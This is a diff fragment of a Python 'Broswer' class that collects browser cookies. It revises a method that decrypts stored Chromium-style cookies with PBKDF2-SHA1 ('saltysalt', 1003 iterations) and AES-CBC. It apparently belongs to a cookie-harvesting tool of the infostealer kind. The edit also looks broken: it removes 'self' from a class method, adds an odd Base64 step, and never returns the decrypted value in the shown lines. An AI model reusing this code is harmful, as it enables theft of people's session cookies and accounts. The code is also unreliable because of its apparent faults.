@@ -96,35 +96,32 @@ class Broswer:
             if cookies_data:
                 self.cookies_path.append({browser_name: cookies_data})
 
-    def decrypter(self, cipher_text, key):
-        # Ensure the cipher_text is at least 3 bytes long
+    def decrypter(cipher_text, key):
         if len(cipher_text) < 3:
             raise ValueError("Ciphertext length is invalid")
 
-        # Prepare the IV (16 spaces as bytes)
         iv = bytes([32] * 16)
 
-        # Derive the key using PBKDF2 with SHA-1
         key = key.encode("utf-8")
         derived_key = hashlib.pbkdf2_hmac('sha1', key, b'saltysalt', 1003)[:16]
 
-        # Extract the ciphertext starting from the 4th byte
         ciphertext = cipher_text[3:]
 
-        # Decode from Base64 if necessary (assuming ciphertext is encoded)
+        # Add padding to Base64 string if necessary
+        missing_padding = len(ciphertext) % 4
+        if missing_padding:
+            ciphertext += b'=' * (4 - missing_padding)
+
         try:
             ciphertext = base64.b64decode(ciphertext)
         except Exception as e:
             print(f"[-] Error decoding Base64: {e}")
             return None
 
-        # Create an AES cipher object for decryption
         cipher = AES.new(derived_key, AES.MODE_CBC, iv)
 
         try:
-            # Decrypt and unpad the data
             decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
-            # Convert decrypted data to UTF-8 string
         except (ValueError, UnicodeDecodeError) as e:
             print(f"[-] Error during decryption: {e}")
             return None
